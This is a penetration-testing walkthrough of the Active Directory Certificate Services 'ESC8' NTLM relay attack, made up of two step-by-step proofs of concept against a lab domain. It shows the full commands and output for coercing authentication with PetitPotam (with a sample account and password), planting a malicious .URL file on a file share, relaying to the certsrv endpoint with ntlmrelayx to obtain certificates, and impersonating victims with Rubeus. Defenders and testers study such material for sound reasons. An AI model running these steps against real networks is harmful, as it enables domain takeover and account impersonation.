==========================================================================================================================================
ADCS Domain Escalation technique "ESC8" - Abusing NTLM relay to ADCS HTTP endpoints 
==========================================================================================================================================

---------------------------------------------------------------------------------------------
Conditions making an AD environment vulnerable to "ESC8" - NLTM relay to ADCS HTTP endpoints
---------------------------------------------------------------------------------------------
> ADCS is configured to allow NTLM authentication;
> NTLM authentication is not protected by EPA (Extended Protection for Authentication) and SMB signing;
> ADCS is running either of these services:
  + Certificate Authority Web Enrollment
  + Certificate Enrollment Web Service
  
> The Certificate Authority Web Enrollment, Certificate Enrollment Policy Web Service, and Network Device Enrollment Service roles in AD CS 
  support HTTP-based certificate enrollment. 
  If NTLM relay protections are not enabled (by default they are not), then these enrollment interfaces are vulnerable to NTLM relay attacks. 
  The Web Enrollment interface is accessible via "http://<ca-server>/certsrv/" and by default it supports HTTP and allows NTLM authentication.

---------------------------------------------------------------------------
Various tools can be used to identify and exploit the "ESC8" vulnerability 
---------------------------------------------------------------------------
> Certify.exe (https://github.com/GhostPack/Certify)
> Ntlmrelayx.py (https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
> Rubeus.exe (https://github.com/GhostPack/Rubeus)
> PetitPotam.py (https://github.com/topotam/PetitPotam)
> SpoolSample (https://github.com/leechristensen/SpoolSample)


==========================================================================================================================================
PoC 1 - Basic exploitation of the "ESC8" vulnerability with the tools "Certify.exe", "PetitPotam.py", "Ntlmrelayx.py" and "Rubeus.exe"
==========================================================================================================================================

-------------------------------------------------------------------------------------------------------------------------------------
Step 1. Validate that the AD Certificate Services are running and that the Certificate Authority Web Enrollment is enabled 
-------------------------------------------------------------------------------------------------------------------------------------

C:\temp> Certify.exe cas /domain:company.work /ldapserver:dc1.company.work /path:CN=Configuration,DC=company,DC=work /showAllPermissions
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=company,DC=work'

[*] Root CAs

    Cert SubjectName              : CN=company-DC1-CA, DC=company, DC=work
    Cert Thumbprint               : F36FAF68E3E14EE6E4A2F4246242D0516D93EBF8
    Cert Serial                   : 244D90F514123BB24E56C0272D6EF900
    Cert Start Date               : 1/7/2023 1:26:54 PM
    Cert End Date                 : 1/7/2028 1:36:53 PM
    Cert Chain                    : CN=company-DC1-CA,DC=company,DC=work

[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=company-DC1-CA, DC=company, DC=work
    Cert Thumbprint               : F36FAF68E3E14EE6E4A2F4246242D0516D93EBF8
    Cert Serial                   : 244D90F514123BB24E56C0272D6EF900
    Cert Start Date               : 1/7/2023 1:26:54 PM
    Cert End Date                 : 1/7/2028 1:36:53 PM
    Cert Chain                    : CN=company-DC1-CA,DC=company,DC=work

[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : company-DC1-CA
    DNS Hostname                  : DC1.company.work
    FullName                      : DC1.company.work\company-DC1-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=company-DC1-CA, DC=company, DC=work
    Cert Thumbprint               : F36FAF68E3E14EE6E4A2F4246242D0516D93EBF8
    Cert Serial                   : 244D90F514123BB24E56C0272D6EF900
    Cert Start Date               : 1/7/2023 1:26:54 PM
    Cert End Date                 : 1/7/2028 1:36:53 PM
    Cert Chain                    : CN=company-DC1-CA,DC=company,DC=work
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Identity                    : NT AUTHORITY\Authenticated UsersS-1-5-11
        AccessControlType         : Allow
        Rights                    : Enroll
        ObjectType                : 00000000-0000-0000-0000-000000000000
        IsInherited               : False
        InheritedObjectType       : 00000000-0000-0000-0000-000000000000
        InheritanceFlags          : ContainerInherit, ObjectInherit
        PropagationFlags          : None
      Identity                    : BUILTIN\Administrators        S-1-5-32-544
        AccessControlType         : Allow
        Rights                    : ManageCA, ManageCertificates
        ObjectType                : 00000000-0000-0000-0000-000000000000
        IsInherited               : False
        InheritedObjectType       : 00000000-0000-0000-0000-000000000000
        InheritanceFlags          : ContainerInherit, ObjectInherit
        PropagationFlags          : None
      Identity                    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
        AccessControlType         : Allow
        Rights                    : ManageCA, ManageCertificates
        ObjectType                : 00000000-0000-0000-0000-000000000000
        IsInherited               : False
        InheritedObjectType       : 00000000-0000-0000-0000-000000000000
        InheritanceFlags          : ContainerInherit, ObjectInherit
        PropagationFlags          : None
      Identity                    : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
        AccessControlType         : Allow
        Rights                    : ManageCA, ManageCertificates
        ObjectType                : 00000000-0000-0000-0000-000000000000
        IsInherited               : False
        InheritedObjectType       : 00000000-0000-0000-0000-000000000000
        InheritanceFlags          : ContainerInherit, ObjectInherit
        PropagationFlags          : None
    Enrollment Agent Restrictions : None

    Enabled Certificate Templates:
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator

Certify completed in 00:00:18.1508451


Verify that the Certificate Authority Web Enrollment is enabled and working by browsing the following URL:
-----------------------------------------------------------------------------------------------------------
=> http://<ca-server>/certsrv/certfnsh.asp
=> http://dc1.company.work/certsrv/certfnsh.asp or http://192.168.1.167/certsrv/certfnsh.asp


------------------------------------------------------------------------------------------------------------------------------------------------
Step 2. Coerce the target Windows server "ORACLESERVER1" (192.168.1.51) to authenticate to a Kali Linux machine running the tool "ntlmrelayx.py"
------------------------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools$ python3 ./PetitPotam.py -u lowprivdomainuser -p Welcome2 -d company 192.168.1.30 192.168.1.51
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

[-] Connecting to ncacn_np:192.168.1.51[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

------------------------------------------------------------------------------------------------------------------------------------------------------------
Step 3. Use the tool "ntlmrelayx.py" to relay the authentication request from the victim server to the ADCS HTTP endpoint (http://ca-server/certsrv/certfnsh.asp)
        and obtain a certificate for the victim server
------------------------------------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/impacket/examples$ sudo python3 ./ntlmrelayx.py -t http://192.168.1.167/certsrv/certfnsh.asp -smb2support --adcs --template Machine
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-4 (process_request_thread): Connection from COMPANY/ORACLESERVER1$@192.168.1.51 controlled, attacking target http://192.168.1.167
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.1.167 as COMPANY/ORACLESERVER1$ SUCCEED
[*] SMBD-Thread-4 (process_request_thread): Connection from COMPANY/ORACLESERVER1$@192.168.1.51 controlled, attacking target http://192.168.1.167
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.1.167 as COMPANY/ORACLESERVER1$ SUCCEED
[*] SMBD-Thread-4 (process_request_thread): Connection from COMPANY/ORACLESERVER1$@192.168.1.51 controlled, attacking target http://192.168.1.167
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.1.167 as COMPANY/ORACLESERVER1$ SUCCEED
[*] SMBD-Thread-4 (process_request_thread): Connection from COMPANY/ORACLESERVER1$@192.168.1.51 controlled, attacking target http://192.168.1.167
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.1.167 as COMPANY/ORACLESERVER1$ SUCCEED
[*] SMBD-Thread-4 (process_request_thread): Connection from COMPANY/ORACLESERVER1$@192.168.1.51 controlled, attacking target http://192.168.1.167
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.1.167 as COMPANY/ORACLESERVER1$ SUCCEED
[*] SMBD-Thread-4 (process_request_thread): Connection from COMPANY/ORACLESERVER1$@192.168.1.51 controlled, attacking target http://192.168.1.167
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.1.167 as COMPANY/ORACLESERVER1$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Skipping user ORACLESERVER1$ since attack was already performed
[*] Base64 certificate of user ORACLESERVER1$: 
MIIRFQIBAzCCEM8GCSqGSIb3DQEHAaCCEMAEghC8MIIQuDCCBu8GCSqGSIb3DQEHBqCCBuAwggbcAgEAMIIG1QYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQI3HYYlrdEs5QCAggAgIIGqB2W75dtMo
Tiegajcym/vmgunR1nGz6YKLkWmyXujmdZh5YPfVHdjFszaPVWkqPsVq+J/BYYThnd8o5pyQlbFzFxhFaHOm38O6Y20cgmZ8IaXjR4ypQ8UOE+dCqoYKXdJ0TuQXx4Oq3eOO2ulCtOJsNig8ZqRJceNKVB
UuJFv6saX7+q1idmY2/DwGj2hPggyPbBc/btu2zI4/X1X3pttu231gElwtro8YPbZYzSggR5u6v5PLZpvdbyXV/gfE4ie1orMFLQM8pfJYnnGh0GTzhLHQe5dxhd+nRV294LxpxjTphHpVWMmd4xL7Iuwx
xwMB5HZ06IHia6w3/J3x10R/SPMWINdXgUDK+J3XBpcZ9W8yJU2QQBDCgI6mZjTqtVe1Yt0ggOGJXD7rKehycdj/l3xQ+oiI2u0cypzmuWr2k5hgE0+e0EOuh69wz/TAicbwy52ml2iExMxdhzUCyHWz1T
UZo+dsH6BxXTHDSOCzNUw/BUHKYtovFTuvJRactAW0EeQPhXYl4TPuz2xAfy2a1djcVVGm42yfzXIUGAkxn3JgZjltWJ4F4u3x8E8YUkC/SjesVWEhvs10BVcv7p0NR4crcKm/Ahu/ipchSFaCfsMJy3py
JjD0vDorWpchgYpwlQuNXarNPO2fVZ0cHb47Q3t+egxd9l6lJi21fO6yOHuYCy7z8vm9L1cpDjpyB5oe5rNIxyex3XXJfqZwESV2D+DG1YK6X/4QEaaf6VCnashYPtAMwxnlRSJ3lDbJkHp54MyBOAH7sK
Zw824vsu6rvqjiPaiPioSt8rhVCgeaJfb/6JW7sHbvII/8Stk9EpkTP7r4XxzJcqK4/G0tJ48nxawVMo/5GATorIhX2gqp02vj40ArdsOmZCKWQLaoVFMMf6nY/6pX2DCkOq6/KcWsETPPHVhCpRa8yUWN
<SNIP>

=> The attack worked and we collected a certificate for the victim machine account "COMPANY\ORACLESERVER1$". 


--------------------------------------------------------------------------------------------------------
Step 4. Impersonate the victim machine account "COMPANY\ORACLESERVER1$" using the tool "Rubeus.exe"
--------------------------------------------------------------------------------------------------------

C:\temp> .\Rubeus.exe asktgt /outfile:kirbi /user:ORACLESERVER1$ /ptt /certificate:MIIRFQIBAzCCEM8GCSqGSIb3DQEHAaCCEMAEgh<SNIP>


==========================================================================================================================================
PoC 2 - Basic exploitation of the "ESC8" vulnerability with a ".URL" file and the tools "Certutil", "Ntlmrelayx.py" and "Rubeus.exe"
==========================================================================================================================================

-------------------------------------------------------------------------------------------------------------------------------------
Step 1. Validate that the AD Certificate Services are running and that the Certificate Authority Web Enrollment is enabled 
-------------------------------------------------------------------------------------------------------------------------------------

You can use certutil to:
- dump and display certification authority (CA) configuration information, 
- configure Certificate Services,
- backup and restore CA components,
- verify certificates, key pairs, and certificate chains.

C:\temp> certutil

Entry 0:
  Name:                         `company-DC1-CA'
  Organizational Unit:          `'
  Organization:                 `'
  Locality:                     `'
  State:                        `'
  Country/region:               `'
  Config:                       `DC1.company.work\company-DC1-CA'
  Exchange Certificate:         `'
  Signature Certificate:        `'
  Description:                  `'
  Server:                       `DC1.company.work'
  Authority:                    `company-DC1-CA'
  Sanitized Name:               `company-DC1-CA'
  Short Name:                   `company-DC1-CA'
  Sanitized Short Name:         `company-DC1-CA'
  Flags:                        `1'
  Web Enrollment Servers:       `'
CertUtil: -dump command completed successfully.


Verify that the ADCS Certificate Authority Web Enrollment is enabled and working by browsing the following URL:
=> http://<ca-server>/certsrv/certfnsh.asp
=> http://dc1.company.work/certsrv/certfnsh.asp or http://192.168.1.167/certsrv/certfnsh.asp


------------------------------------------------------------------------------------------------------------------------------------------
Step 2. Add a malicious ".URL" file in an unrestricted network file share that will coerce victim users (when they browse the file share) 
        to authenticate to a Kali Linux machine running the tool "ntlmrelayx.py"
------------------------------------------------------------------------------------------------------------------------------------------

$ cat MaliciousURLfile.url
[InternetShortcut]
URL=http://192.168.1.30
WorkingDirectory=securityaudit
IconFile=\\192.168.1.30\share\auditor.ico
IconIndex=1


----------------------------------------------------------------------------------------------------------------------------------------------------------------
Step 3. Use the tool "ntlmrelayx.py" to relay the authentication request from the victim users to the ADCS HTTP endpoint (http://ca-server/certsrv/certfnsh.asp)
        and obtain a certificate for the victim users
----------------------------------------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/impacket/examples$ sudo python3 ./ntlmrelayx.py -t http://192.168.1.167/certsrv/certfnsh.asp -smb2support --adcs --template User
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-4 (process_request_thread): Connection from COMPANY/CLAUDIA.CARDINALE@192.168.1.51 controlled, attacking target http://192.168.1.167
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.1.167 as COMPANY/CLAUDIA.CARDINALE SUCCEED
[*] SMBD-Thread-4 (process_request_thread): Connection from COMPANY/CLAUDIA.CARDINALE@192.168.1.51 controlled, attacking target http://192.168.1.167
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.1.167 as COMPANY/CLAUDIA.CARDINALE SUCCEED
[*] SMBD-Thread-4 (process_request_thread): Connection from COMPANY/CLAUDIA.CARDINALE@192.168.1.51 controlled, attacking target http://192.168.1.167
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.1.167 as COMPANY/CLAUDIA.CARDINALE SUCCEED
[*] SMBD-Thread-4 (process_request_thread): Connection from COMPANY/CLAUDIA.CARDINALE@192.168.1.51 controlled, attacking target http://192.168.1.167
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.1.167 as COMPANY/CLAUDIA.CARDINALE SUCCEED
[*] SMBD-Thread-4 (process_request_thread): Connection from COMPANY/CLAUDIA.CARDINALE@192.168.1.51 controlled, attacking target http://192.168.1.167
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.1.167 as COMPANY/CLAUDIA.CARDINALE SUCCEED
[*] SMBD-Thread-4 (process_request_thread): Connection from COMPANY/CLAUDIA.CARDINALE@192.168.1.51 controlled, attacking target http://192.168.1.167
[*] Generating CSR...
[*] CSR generated!
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.1.167 as COMPANY/CLAUDIA.CARDINALE SUCCEED
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user CLAUDIA.CARDINALE: 
MIIRrQIBAzCCEWcGCSqGSIb3DQEHAaCCEVgEghFUMIIRUDCCB38GCSqGSIb3DQEHBqCCB3AwggdsAgEAMIIHZQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIDiapIg8fs58CAggAgIIHOJGMZyrmmr
Yzr56k0A9aJBz3cpZxCDHlLYxf7/eTTk1PKVVpcjLNGsngu8Fa73zV1GDYgxTadO/dWjEaLlYlPndFzhFfnVAC/Sv4ua8rydEjuoYHkOT1B4f2Bnu6e4C7wlm5vrJ/reIy1I+jaO2bPWcl9gb7VRiMbpgz
+RcHJQkTCVcy/6WUeFp029GaYgptLLZJa5hMjOP3kHuhxEYJK51TQkO4/RhRkO8avMM5Tzff+qiF611Gq68+R0VVKBKFxk3Jb5lr64rV7X5IHne/3wsJb2MCLLJXbNd4KQ8Qk87zqntcQK66Tctkt+PKNu
iRpGh0rdnz3uZpXe7RDI8tYUu3DEA9XMSns1dxuvKBHzeUXkPihAU9X9775OEuzqLfG4S+LLcymNtfSv7E2PRtrE8VIbRxu6sjsjIC9rjEWK13qQTUS+4L7Y5ydjT2KQwDwlHsU0IUiKhYQAybPqT5CEFY
/i7CFYDLqv586tdyaeOPj875dM+J/A7hwXoiivEmk5R1Qi2ItV0GnTd+unudxSV8sstJ8eRiji7R1mKWLI7vDdNaVj/vcNKpSi1w0sHAggiJM+Y/22VA6uZ/qPdd1ThRwHGwOK/Hi9S8d6D3j8ghCH+gWB
EOhHCSzYvO9oedDZX5IOZKj51GlBagCDmwRlVsnpfYUJ1zDPHsMsBshcoJGdQ8Yd+sW9sLRY9kkCX/ESJ4HZJw3ZV84PN3pk7wtrH/Q/1W6im8WpgNDNE23lNe5/XtE6VpBPnaOTJxL1Q7Maid5fIwV1gS
gzj6tT2JGBYIvIkgi99MFNFC3zTJ04gagxeuP10verqZjE8a3l6ewNieK9CMN8yN+5lHEHq04TsA/TSzxiN2C98Y5WheceDmyp2MbpbtnQeI3F1adrZi26mPTf7HpY39V4BJHtTpsFTsYeMXKKgxbLmB74
f3gA3DcIbCyzcfIBToPJtU/vkaDVHSogU+13XtfjZwPCr0XfBdLqfMOKI/wetuADyQ5JCxZNvPSjb0/fNqQ7lAkGEAubf3bopyn6cqkfgeXStw3KiecFbWrQbiPwJ5uzYWmuxnDatKcv/EZyy7XVnf4Zui
e/6Zkq4TrEWiC69wecFyOUC7UbItLCpF1xWvl8UJA1sdB4LHrKh/n70xxA4BHvN1yaRlOQrUczF3Dg04ZaMXTVPkIfOFPlu77Px3HfakbwVh+fsVh8CnPZ91/qtm1F13383yz5FhNj8vPMafDc+N+rh/yg
6mk470WX3KdsHsmIE8QSkGxxYkpsbGXF3fg9/DIpLLh+DJZC0CReh6dt0bhAYTGZhI/Zhkrp9Tag2wxa+q6dnEW8CKAZ+UqdTFIxQxTcJPRiCEbuBzZLXu/4U6l1Q89LHkbsRWDmiATcGvG8SU5EC6sQmE
<SNIP>

=> The attack worked and we collected a certificate for the victim user account "COMPANY\CLAUDIA.CARDINALE". 


-------------------------------------------------------------------------------------
Step 4. Impersonate the victim user account using the tool "Rubeus.exe"
-------------------------------------------------------------------------------------

C:\temp> .\Rubeus.exe asktgt /outfile:kirbi /user:CLAUDIA.CARDINALE /ptt /certificate:MIIRrQIBAzCCEWcGCSqGSIb3DQEHA<SNIP>
